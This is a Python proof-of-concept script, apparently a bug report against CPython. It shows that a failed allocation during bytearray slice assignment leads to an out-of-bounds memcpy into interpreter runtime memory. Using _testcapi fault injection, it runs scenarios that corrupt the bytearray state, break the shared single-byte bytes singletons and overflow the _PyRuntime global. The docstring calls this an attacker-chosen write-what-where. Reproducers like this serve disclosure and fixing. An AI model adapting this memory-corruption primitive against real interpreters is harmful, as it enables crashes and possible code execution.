#!/usr/bin/env python3
"""bytearray slice-assignment: the 2013 allocation-failure recovery in
`bytearray_setslice_linear` now runs on an object that
`bytearray_resize_lock_held` has already destroyed.

    Objects/bytearrayobject.c:280-285   the wrecking failure handler
    Objects/bytearrayobject.c:586-605   the stale bpo-19568 recovery
    Objects/bytearrayobject.c:631       the out-of-bounds memcpy

Since 732224e1139 (gh-139871, 2025-11-13) a failed `_PyBytes_Resize` inside
`bytearray_resize_lock_held` does NOT leave the buffer intact any more -- it
installs the *immortal empty bytes* and zeroes size/alloc:

    280  int ret = _PyBytes_Resize(&obj->ob_bytes_object, alloc);
    281  if (ret == -1) {
    282      obj->ob_bytes_object = Py_GetConstant(Py_CONSTANT_EMPTY_BYTES);
    283      size = alloc = 0;
    284  }
    285  bytearray_reinit_from_bytes(obj, size, alloc);

`bytearray_setslice_linear`'s recovery, written by Victor Stinner in 2013
(8455723cfb0c, bpo-19568 / gh-63767) against the old realloc-based
implementation, still assumes the buffer survived:

    586  if (bytearray_resize_lock_held((PyObject *)self, Py_SIZE(self) + growth) < 0) {
    588      /* Issue #19578: ... the bytearray object has already been modified. */
    597      if (lo == 0) {
    598          self->ob_start += growth;              <- ob_start now BELOW ob_bytes
    599          return -1;
    600      }
    603      Py_SET_SIZE(self, Py_SIZE(self) + growth); <- 0 + negative == NEGATIVE
    604      res = -1;
    605  }
    606  buf = PyByteArray_AS_STRING(self);            <- the immortal empty sval
    ...
    630  if (bytes_len > 0)
    631      memcpy(buf + lo, bytes, bytes_len);        <- OOB WRITE into _PyRuntime

`buf` is `&_PyRuntime.static_objects.singletons.bytes_empty.ob_sval[0]`, and the
next thing in that struct is `bytes_characters[256]` -- the shared single-byte
`bytes` singletons -- followed by `struct _Py_global_strings`.  `lo` and the
assigned bytes are both attacker-chosen, so this is a bounded write-what-where
into the interpreter runtime.

Scenarios
    state       lo != 0, small write: negative Py_SIZE, len() raises SystemError,
                the bytearray is permanently unusable.  SIGABRT on debug builds.
    singleton   lo != 0, 40-byte write at offset 100: corrupts
                bytes_characters[2]; the NEXT unrelated `bytes([2])` SIGSEGVs.
    runtime     lo != 0, 100 KB write at offset 200 KB: runs off the end of the
                346 KB `_PyRuntime` global.  SIGSEGV on plain builds, and
                `AddressSanitizer: global-buffer-overflow` on an ASan build.
    lo_zero     lo == 0: `ob_start` driven below `ob_bytes`; benign on release,
                `Assertion 'logical_offset <= alloc' failed` on debug.
    control     the same slice assignment with NO injection.

Usage
    python bytearray_setslice_resize_fail_oob.py <python> [scenario ...]
    python bytearray_setslice_resize_fail_oob.py <python> --n <scenario> <index>
"""

import subprocess
import sys

# scenario -> (size, lo, bytes_len, probe)
SCENARIOS = {
    "state":     (4_000,      100,     4,       "state"),
    "state_del": (4_000,      100,     0,       "state"),
    "singleton": (4_000,      100,     40,      "singleton"),
    "runtime":   (1_000_000,  200_000, 100_000, "state"),
    "lo_zero":   (4_000,      0,       4,       "state"),
}

CHILD = r'''
import sys, faulthandler
faulthandler.enable()
import _testcapi

SIZE, LO, BL, N, PROBE = {size}, {lo}, {bl}, {n}, {probe!r}
src = bytes(b'\xAA' * BL)

# Warm the whole path once, UNARMED, so the injection budget is spent on the
# slice assignment and not on the compiler or the freelists.
b = bytearray(b'x' * SIZE)
try:
    b[LO:SIZE] = src
except MemoryError:
    pass
b = bytearray(b'x' * SIZE)

if N >= 0:
    _testcapi.set_nomemory(N, N + 1)
try:
    b[LO:SIZE] = src
    r = "no-exception"
except MemoryError:
    r = "MemoryError"
except BaseException as e:
    r = "%s: %s" % (type(e).__name__, e)
finally:
    try:
        _testcapi.remove_mem_hooks()
    except Exception:
        pass
print("OP:%s" % r)
sys.stdout.flush()

if PROBE == "singleton":
    # The OOB write landed on _PyRuntime.static_objects.singletons.
    # Touch the shared single-byte bytes objects one at a time.
    for i in range(6):
        print("SINGLETON:%d=%r" % (i, bytes([i])))
        sys.stdout.flush()
else:
    for label, fn in (
        ("len", lambda: len(b)),
        ("bytes", lambda: bytes(b)[:16]),
        ("repr", lambda: repr(b)[:32]),
        ("append", lambda: (b.append(65), len(b))[1]),
    ):
        try:
            print("USE:%s=%r" % (label, fn()))
        except BaseException as e:
            print("USE:%s=EXC %s: %s" % (label, type(e).__name__, e))
        sys.stdout.flush()
print("DONE")
'''


def run(python, scenario, n):
    size, lo, bl, probe = SCENARIOS[scenario]
    src = CHILD.format(size=size, lo=lo, bl=bl, n=n, probe=probe)
    return subprocess.run([python, "-c", src], capture_output=True, text=True, timeout=300)


def show(p, prefix=""):
    out = " | ".join(x for x in p.stdout.splitlines() if x)
    san = "ASAN" if "Sanitizer" in p.stderr else ""
    print(f"{prefix}rc={p.returncode:5d} {san:5s} {out}")
    if san or p.returncode not in (0, 1):
        head = [ln for ln in p.stderr.strip().splitlines()[:12]]
        print("        " + "\n        ".join(head))


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return 2
    python = sys.argv[1]
    rest = sys.argv[2:]

    if rest and rest[0] == "--n":
        show(run(python, rest[1], int(rest[2])))
        return 0

    scenarios = rest or list(SCENARIOS)
    for sc in scenarios:
        print(f"### {sc}   (size={SCENARIOS[sc][0]} lo={SCENARIOS[sc][1]} "
              f"bytes_len={SCENARIOS[sc][2]})")
        show(run(python, sc, -1), prefix="  control (no injection)  ")
        for n in range(0, 12):
            p = run(python, sc, n)
            interesting = (
                p.returncode != 0
                or "Sanitizer" in p.stderr
                or "EXC" in p.stdout
                or "no-exception" not in p.stdout
            )
            if interesting:
                show(p, prefix=f"  n={n:<3d}                   ")
        print()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
